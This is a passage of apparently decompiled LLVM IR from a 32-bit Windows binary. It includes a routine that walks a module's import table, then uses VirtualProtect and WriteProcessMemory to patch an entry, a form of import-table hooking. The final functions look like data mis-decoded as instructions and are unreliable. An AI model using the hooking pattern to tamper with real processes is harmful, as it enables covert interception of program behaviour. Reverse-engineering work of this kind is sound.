  %197 = load i32, i32* %196, align 4, !insn.addr !2033
  call void @__writefsdword(i32 0, i32 %197), !insn.addr !2033
  br label %dec_label_pc_40765e, !insn.addr !2034

dec_label_pc_40765e:                              ; preds = %dec_label_pc_40764f, %dec_label_pc_407647
  %198 = add i32 %151, 4, !insn.addr !2035
  %199 = inttoptr i32 %198 to i32*, !insn.addr !2035
  %200 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2036
  ret i32 %151, !insn.addr !2037
}

define i32 @function_407668() local_unnamed_addr {
dec_label_pc_407668:
  %eax.1.reg2mem = alloca i32, !insn.addr !2038
  %eax.0.reg2mem = alloca i32, !insn.addr !2038
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2039
  %4 = add i32 %3, 8, !insn.addr !2040
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2040
  %6 = load i32, i32* %5, align 4, !insn.addr !2040
  %7 = icmp eq i32 %6, 0, !insn.addr !2040
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2041
  br i1 %7, label %dec_label_pc_4076a2, label %dec_label_pc_407679, !insn.addr !2041

dec_label_pc_407679:                              ; preds = %dec_label_pc_407668
  %8 = add i32 %3, 24, !insn.addr !2042
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2042
  %10 = load i32, i32* %9, align 4, !insn.addr !2042
  %11 = icmp eq i32 %10, 0, !insn.addr !2042
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2043
  br i1 %11, label %dec_label_pc_4076a2, label %dec_label_pc_40767f, !insn.addr !2043

dec_label_pc_40767f:                              ; preds = %dec_label_pc_407679
  %12 = add i32 %3, 4, !insn.addr !2044
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2044
  %14 = load i32, i32* %13, align 4, !insn.addr !2044
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2045
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2046
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2046
  %18 = load i32, i32* %5, align 4, !insn.addr !2047
  %19 = icmp eq i32 %18, %17, !insn.addr !2047
  %20 = icmp eq i1 %19, false, !insn.addr !2048
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2048
  br i1 %20, label %dec_label_pc_4076a2, label %dec_label_pc_40768d, !insn.addr !2048

dec_label_pc_40768d:                              ; preds = %dec_label_pc_40767f
  %21 = load i32, i32* %9, align 4, !insn.addr !2049
  %22 = call i32 @function_4076b0(i32 %21), !insn.addr !2050
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2050
  br label %dec_label_pc_4076a2, !insn.addr !2050

dec_label_pc_4076a2:                              ; preds = %dec_label_pc_40768d, %dec_label_pc_40767f, %dec_label_pc_407679, %dec_label_pc_407668
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2051
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2052
  br i1 %24, label %dec_label_pc_4076ad, label %dec_label_pc_4076a6, !insn.addr !2052

dec_label_pc_4076a6:                              ; preds = %dec_label_pc_4076a2
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2053
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2053
  br label %dec_label_pc_4076ad, !insn.addr !2053

dec_label_pc_4076ad:                              ; preds = %dec_label_pc_4076a6, %dec_label_pc_4076a2
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2054
}

define i32 @function_4076b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4076b0:
  %eax.0.reg2mem = alloca i32, !insn.addr !2055
  %esp.0.reg2mem = alloca i32, !insn.addr !2055
  %storemerge6.reg2mem = alloca i32, !insn.addr !2055
  %.reg2mem14 = alloca i32, !insn.addr !2055
  %esp.17.reg2mem = alloca i32, !insn.addr !2055
  %esi.08.reg2mem = alloca i32, !insn.addr !2055
  %.reg2mem = alloca i32, !insn.addr !2055
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2056
  %4 = icmp eq i1 %3, false, !insn.addr !2057
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2058
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_40775d, label %dec_label_pc_4076d6, !insn.addr !2057

dec_label_pc_4076d6:                              ; preds = %dec_label_pc_4076b0
  %6 = trunc i32 %2 to i16, !insn.addr !2059
  %7 = trunc i32 %1 to i8, !insn.addr !2060
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2061
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2062
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2062
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2062
  %11 = icmp eq i32* %9, null, !insn.addr !2063
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2064
  br i1 %11, label %dec_label_pc_40775d, label %dec_label_pc_407756.preheader, !insn.addr !2064

dec_label_pc_407756.preheader:                    ; preds = %dec_label_pc_4076d6
  %12 = add i32 %10, 12, !insn.addr !2065
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2065
  %14 = load i32, i32* %13, align 4, !insn.addr !2065
  %15 = icmp eq i32 %14, 0, !insn.addr !2066
  %16 = icmp eq i1 %15, false, !insn.addr !2067
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2067
  br i1 %16, label %dec_label_pc_4076ef.lr.ph, label %dec_label_pc_40775d, !insn.addr !2067

dec_label_pc_4076ef.lr.ph:                        ; preds = %dec_label_pc_407756.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2061
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2068
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_4076ef

dec_label_pc_4076ef:                              ; preds = %dec_label_pc_4076ef.lr.ph, %dec_label_pc_407753
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2069
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2070
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2070
  store i32 %18, i32* %25, align 4, !insn.addr !2070
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2071
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2071
  store i32 %23, i32* %27, align 4, !insn.addr !2071
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2072
  %29 = icmp eq i32 %28, 0, !insn.addr !2073
  %30 = icmp eq i1 %29, false, !insn.addr !2074
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2074
  br i1 %30, label %dec_label_pc_407753, label %dec_label_pc_407702, !insn.addr !2074

dec_label_pc_407702:                              ; preds = %dec_label_pc_4076ef
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2075
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2075
  %33 = load i32, i32* %32, align 4, !insn.addr !2075
  %34 = add i32 %33, %arg1, !insn.addr !2076
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2077
  %36 = load i32, i32* %35, align 4, !insn.addr !2077
  %37 = icmp eq i32 %36, 0, !insn.addr !2078
  %38 = icmp eq i1 %37, false, !insn.addr !2079
  store i32 %36, i32* %.reg2mem14, !insn.addr !2079
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2079
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2079
  br i1 %38, label %dec_label_pc_40770a, label %dec_label_pc_407753, !insn.addr !2079

dec_label_pc_40770a:                              ; preds = %dec_label_pc_407702, %dec_label_pc_40774a
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2080
  %40 = icmp eq i1 %39, false, !insn.addr !2081
  br i1 %40, label %dec_label_pc_40774a, label %dec_label_pc_40770f, !insn.addr !2081

dec_label_pc_40770f:                              ; preds = %dec_label_pc_40770a
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2082
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2082
  store i32 %20, i32* %42, align 4, !insn.addr !2082
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2083
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2083
  store i32 128, i32* %44, align 4, !insn.addr !2083
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2084
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2084
  store i32 4, i32* %46, align 4, !insn.addr !2084
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2085
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2085
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2085
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2086
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2087
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2087
  store i32 %21, i32* %51, align 4, !insn.addr !2087
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2088
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2088
  store i32 4, i32* %53, align 4, !insn.addr !2088
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2089
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2089
  store i32 %22, i32* %55, align 4, !insn.addr !2089
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2090
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2090
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2090
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2091
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2091
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2092
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2092
  store i32 %59, i32* %61, align 4, !insn.addr !2092
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2093
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2094
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2094
  store i32 %21, i32* %64, align 4, !insn.addr !2094
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2095
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2096
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2096
  store i32 %65, i32* %67, align 4, !insn.addr !2096
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2097
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2097
  store i32 4, i32* %69, align 4, !insn.addr !2097
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2098
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2098
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2098
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2099
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2100
  br label %dec_label_pc_407753, !insn.addr !2100

dec_label_pc_40774a:                              ; preds = %dec_label_pc_40770a
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2101
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2077
  %75 = load i32, i32* %74, align 4, !insn.addr !2077
  %76 = icmp eq i32 %75, 0, !insn.addr !2078
  %77 = icmp eq i1 %76, false, !insn.addr !2079
  store i32 %75, i32* %.reg2mem14, !insn.addr !2079
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2079
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2079
  br i1 %77, label %dec_label_pc_40770a, label %dec_label_pc_407753, !insn.addr !2079

dec_label_pc_407753:                              ; preds = %dec_label_pc_40774a, %dec_label_pc_407702, %dec_label_pc_40770f, %dec_label_pc_4076ef
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2102
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2065
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2065
  %81 = load i32, i32* %80, align 4, !insn.addr !2065
  %82 = icmp eq i32 %81, 0, !insn.addr !2066
  %83 = icmp eq i1 %82, false, !insn.addr !2067
  store i32 %81, i32* %.reg2mem, !insn.addr !2067
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2067
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2067
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2067
  br i1 %83, label %dec_label_pc_4076ef, label %dec_label_pc_40775d, !insn.addr !2067

dec_label_pc_40775d:                              ; preds = %dec_label_pc_407753, %dec_label_pc_407756.preheader, %dec_label_pc_4076d6, %dec_label_pc_4076b0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2103
}

define i32 @function_407768(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407768:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2104
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2104
  %3 = load i32, i32* %2, align 4, !insn.addr !2104
  ret i32 %3, !insn.addr !2105
}

define i32 @function_40776c() local_unnamed_addr {
dec_label_pc_40776c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2106
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2106
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2106
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2107
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2108
  %3 = add i32 %2, 1, !insn.addr !2108
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2108
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2109
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2110
  ret i32 0, !insn.addr !2111
}

define i32 @function_407791() local_unnamed_addr {
dec_label_pc_407791:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2112
  ret i32 %0, !insn.addr !2112
}

define i32 @function_407796() local_unnamed_addr {
dec_label_pc_407796:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2113
}

define i32 @function_407798(i32 %arg1) local_unnamed_addr {
dec_label_pc_407798:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2114
}

define i32 @function_40779c() local_unnamed_addr {
dec_label_pc_40779c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2115
  %2 = add i32 %1, -1, !insn.addr !2115
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2115
  ret i32 %0, !insn.addr !2116
}

define i32 @function_4077a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4077a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_407768(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2117
  ret i32 %3, !insn.addr !2118
}

define i32 @function_4077f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4077f0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2119
  %2 = icmp eq i1 %1, false, !insn.addr !2120
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_407768(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2121
  ret i32 %3, !insn.addr !2122
}

define i32 @function_407820(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407820:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2123
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2123
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2123
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2124
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2125
  %3 = call i32 @"@LStrPos"(), !insn.addr !2126
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_4078f8 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2127
  %6 = call i32 @"@LStrPos"(), !insn.addr !2128
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_4078f8 to i32)
  %8 = call i32 @function_407768(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2129
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2130
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2131
  ret i32 %9, !insn.addr !2132
}

define i32 @function_4078b8() local_unnamed_addr {
dec_label_pc_4078b8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2133
  ret i32 %0, !insn.addr !2133
}

define i32 @function_4078bd() local_unnamed_addr {
dec_label_pc_4078bd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2134
}

define i32 @function_4078bf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4078bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2135
}

define i32 @function_4078cf() local_unnamed_addr {
dec_label_pc_4078cf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2136
}

define i32 @function_4078d1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_4078d1:
  %merge.reg2mem = alloca i32, !insn.addr !2137
  %storemerge7.in.reg2mem = alloca i8, !insn.addr !2137
  %storemerge8.reg2mem = alloca i32, !insn.addr !2137
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg14, i32* %stack_var_0, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !2137
  %7 = inttoptr i32 %4 to i8*, !insn.addr !2137
  store i8 %6, i8* %7, align 1, !insn.addr !2137
  %8 = add i32 %4, 116, !insn.addr !2138
  %9 = inttoptr i32 %8 to i8*, !insn.addr !2138
  %10 = load i8, i8* %9, align 1, !insn.addr !2138
  %11 = udiv i32 %3, 256, !insn.addr !2138
  %12 = trunc i32 %11 to i8, !insn.addr !2138
  %13 = add i8 %10, %12, !insn.addr !2138
  %14 = icmp eq i8 %13, 0, !insn.addr !2138
  store i8 %13, i8* %9, align 1, !insn.addr !2138
  br i1 %14, label %dec_label_pc_407960, label %dec_label_pc_4078d8, !insn.addr !2139

dec_label_pc_4078d8:                              ; preds = %dec_label_pc_4078d1
  %15 = bitcast i32* %edi to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2140
  %17 = and i8 %12, 15, !insn.addr !2140
  %18 = and i8 %16, 15, !insn.addr !2140
  %19 = sub nsw i8 %17, %18, !insn.addr !2140
  %20 = icmp ugt i8 %19, 15, !insn.addr !2140
  %21 = icmp ugt i8 %16, %12, !insn.addr !2140
  %22 = and i8 %5, 14, !insn.addr !2141
  %23 = icmp ugt i8 %22, 9, !insn.addr !2141
  %24 = or i1 %23, %20, !insn.addr !2141
  %25 = icmp ugt i8 %5, -103
  %26 = or i1 %25, %21
  br i1 %24, label %27, label %32, !insn.addr !2141

; <label>:27:                                     ; preds = %dec_label_pc_4078d8
  %.v6 = select i1 %26, i8 -102, i8 -6
  %28 = add i8 %.v6, %5, !insn.addr !2141
  %29 = zext i8 %28 to i32, !insn.addr !2141
  %30 = and i32 %4, -256, !insn.addr !2141
  %31 = or i32 %30, %29, !insn.addr !2141
  store i32 %31, i32* %storemerge8.reg2mem, !insn.addr !2141
  store i8 %28, i8* %storemerge7.in.reg2mem, !insn.addr !2141
  br label %38, !insn.addr !2141

; <label>:32:                                     ; preds = %dec_label_pc_4078d8
  %33 = add i8 %5, -96, !insn.addr !2141
  %34 = select i1 %26, i8 %33, i8 %5, !insn.addr !2141
  %35 = zext i8 %34 to i32, !insn.addr !2141
  %36 = and i32 %4, -256, !insn.addr !2141
  %37 = or i32 %36, %35, !insn.addr !2141
  store i32 %37, i32* %storemerge8.reg2mem, !insn.addr !2141
  store i8 %34, i8* %storemerge7.in.reg2mem, !insn.addr !2141
  br label %38, !insn.addr !2141

; <label>:38:                                     ; preds = %27, %32
  %39 = sub i8 %12, %16, !insn.addr !2140
  %40 = xor i8 %16, %12, !insn.addr !2140
  %41 = xor i8 %39, %12, !insn.addr !2140
  %42 = and i8 %41, %40, !insn.addr !2140
  %43 = icmp slt i8 %42, 0, !insn.addr !2140
  %storemerge8.reload = load i32, i32* %storemerge8.reg2mem
  %44 = trunc i32 %2 to i16, !insn.addr !2142
  %45 = call i32 @__asm_insd(i16 %44), !insn.addr !2142
  %46 = load i32, i32* %edi, align 4, !insn.addr !2142
  %47 = inttoptr i32 %46 to i32*, !insn.addr !2142
  store i32 %45, i32* %47, align 4, !insn.addr !2142
  br i1 %43, label %dec_label_pc_40790e, label %dec_label_pc_407953, !insn.addr !2143

dec_label_pc_40790e:                              ; preds = %38
  %storemerge7.in.reload = load i8, i8* %storemerge7.in.reg2mem
  %storemerge7 = icmp eq i8 %storemerge7.in.reload, 0
  %48 = call i8 @__readgsbyte(i32 %0), !insn.addr !2144
  call void @__asm_outsb(i16 %44, i8 %48), !insn.addr !2144
  br i1 %storemerge7, label %dec_label_pc_407987, label %dec_label_pc_407912, !insn.addr !2145

dec_label_pc_407912:                              ; preds = %dec_label_pc_40790e
  br i1 %26, label %dec_label_pc_407980, label %dec_label_pc_407914, !insn.addr !2146

dec_label_pc_407914:                              ; preds = %dec_label_pc_407912
  store i32 117, i32* %edi, align 4, !insn.addr !2147
  %49 = load i32, i32* inttoptr (i32 54 to i32*), align 4, !insn.addr !2148
  %50 = xor i32 %49, %0, !insn.addr !2148
  store i32 %50, i32* inttoptr (i32 54 to i32*), align 4, !insn.addr !2148
  %51 = add i32 %storemerge8.reload, -116, !insn.addr !2149
  %52 = inttoptr i32 %51 to i8*, !insn.addr !2149
  %53 = load i8, i8* %52, align 1, !insn.addr !2149
  %54 = add i8 %53, %12, !insn.addr !2149
  %55 = icmp slt i8 %54, 0, !insn.addr !2149
  store i8 %54, i8* %52, align 1, !insn.addr !2149
  %56 = icmp eq i1 %55, false, !insn.addr !2150
  store i32 %storemerge8.reload, i32* %merge.reg2mem, !insn.addr !2150
  br i1 %56, label %dec_label_pc_407960, label %dec_label_pc_407920, !insn.addr !2150

dec_label_pc_407920:                              ; preds = %dec_label_pc_407914
  %57 = add i32 %storemerge8.reload, -104, !insn.addr !2151
  %58 = inttoptr i32 %57 to i8*, !insn.addr !2151
  %59 = load i8, i8* %58, align 1, !insn.addr !2151
  %60 = add i8 %59, %12, !insn.addr !2151
  %61 = icmp slt i8 %60, 0, !insn.addr !2151
  store i8 %60, i8* %58, align 1, !insn.addr !2151
  %62 = icmp eq i1 %61, false, !insn.addr !2152
  br i1 %62, label %dec_label_pc_407965, label %dec_label_pc_407925, !insn.addr !2152

dec_label_pc_407925:                              ; preds = %dec_label_pc_407920
  %63 = add i32 %storemerge8.reload, -92, !insn.addr !2153
  %64 = inttoptr i32 %63 to i8*, !insn.addr !2153
  %65 = load i8, i8* %64, align 1, !insn.addr !2153
  %66 = add i8 %65, %12, !insn.addr !2153
  %67 = icmp ult i8 %66, %65, !insn.addr !2153
  %68 = icmp eq i8 %66, 0, !insn.addr !2153
  store i8 %66, i8* %64, align 1, !insn.addr !2153
  %69 = or i1 %67, %68, !insn.addr !2154
  store i32 %storemerge8.reload, i32* %merge.reg2mem, !insn.addr !2154
  br i1 %69, label %dec_label_pc_407932, label %dec_label_pc_407960, !insn.addr !2154

dec_label_pc_407932:                              ; preds = %dec_label_pc_407925
  %70 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !2147
  %71 = add i32 %3, ptrtoint ([14 x i8]* @global_var_4079a4 to i32), !insn.addr !2155
  %72 = inttoptr i32 %71 to i8*, !insn.addr !2155
  %73 = load i8, i8* %72, align 1, !insn.addr !2155
  %74 = udiv i32 %1, 256, !insn.addr !2155
  %75 = trunc i32 %74 to i8, !insn.addr !2155
  %76 = add i8 %73, %75, !insn.addr !2155
  store i8 %76, i8* %72, align 1, !insn.addr !2155
  store i32 ptrtoint (i32* @global_var_4075d0 to i32), i32* @global_var_40810c, align 4, !insn.addr !2156
  %77 = add i32 %70, -4, !insn.addr !2157
  %78 = inttoptr i32 %77 to i32*, !insn.addr !2157
  store i32 ptrtoint ([11 x i8]* @global_var_40798c to i32), i32* %78, align 4, !insn.addr !2157
  ret i32 ptrtoint (i32* @global_var_4075d0 to i32), !insn.addr !2157

dec_label_pc_407953:                              ; preds = %38
  %79 = add i32 %2, 1971626241, !insn.addr !2158
  %80 = inttoptr i32 %79 to i8*, !insn.addr !2158
  %81 = load i8, i8* %80, align 1, !insn.addr !2158
  %82 = udiv i32 %2, 256, !insn.addr !2158
  %83 = trunc i32 %82 to i8, !insn.addr !2158
  %84 = add i8 %81, %83, !insn.addr !2158
  store i8 %84, i8* %80, align 1, !insn.addr !2158
  %85 = add i32 %storemerge8.reload, 2, !insn.addr !2159
  ret i32 %85, !insn.addr !2159

dec_label_pc_407960:                              ; preds = %dec_label_pc_407965, %dec_label_pc_407925, %dec_label_pc_4078d1, %dec_label_pc_407987, %dec_label_pc_407914
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2159

dec_label_pc_407965:                              ; preds = %dec_label_pc_407920
  %86 = add i32 %storemerge8.reload, -52, !insn.addr !2160
  %87 = inttoptr i32 %86 to i8*, !insn.addr !2160
  %88 = load i8, i8* %87, align 1, !insn.addr !2160
  %89 = add i8 %88, %12, !insn.addr !2160
  %90 = icmp slt i8 %89, 0, !insn.addr !2160
  store i8 %89, i8* %87, align 1, !insn.addr !2160
  %91 = icmp eq i1 %90, false, !insn.addr !2161
  store i32 %storemerge8.reload, i32* %merge.reg2mem, !insn.addr !2161
  br i1 %91, label %dec_label_pc_4079aa, label %dec_label_pc_407960, !insn.addr !2161

dec_label_pc_407980:                              ; preds = %dec_label_pc_407912
  %92 = add i32 %storemerge8.reload, %11, !insn.addr !2162
  %93 = and i32 %92, 255, !insn.addr !2162
  %94 = and i32 %storemerge8.reload, -256, !insn.addr !2162
  %95 = or i32 %93, %94, !insn.addr !2162
  ret i32 %95, !insn.addr !2163

dec_label_pc_407987:                              ; preds = %dec_label_pc_40790e
  %96 = select i1 %26, i32 130, i32 129, !insn.addr !2164
  %97 = add i32 %storemerge8.reload, %96, !insn.addr !2164
  %98 = and i32 %97, 255, !insn.addr !2164
  %99 = and i32 %storemerge8.reload, -256, !insn.addr !2164
  %100 = or i32 %98, %99, !insn.addr !2164
  %101 = add i32 %100, 1, !insn.addr !2165
  store i32 %101, i32* %merge.reg2mem, !insn.addr !2165
  br label %dec_label_pc_407960, !insn.addr !2165

dec_label_pc_4079aa:                              ; preds = %dec_label_pc_407965
  %102 = icmp eq i8 %89, 0, !insn.addr !2160
  br i1 %102, label %dec_label_pc_407a1e, label %dec_label_pc_4079ac, !insn.addr !2166

dec_label_pc_4079ac:                              ; preds = %dec_label_pc_4079aa
  %103 = call i8 @__asm_insb(i16 %44), !insn.addr !2167
  %104 = load i32, i32* %edi, align 4, !insn.addr !2167
  %105 = inttoptr i32 %104 to i8*, !insn.addr !2167
  store i8 %103, i8* %105, align 1, !insn.addr !2167
  %106 = inttoptr i32 %storemerge8.reload to i8*, !insn.addr !2168
  %107 = load i8, i8* %106, align 1, !insn.addr !2168
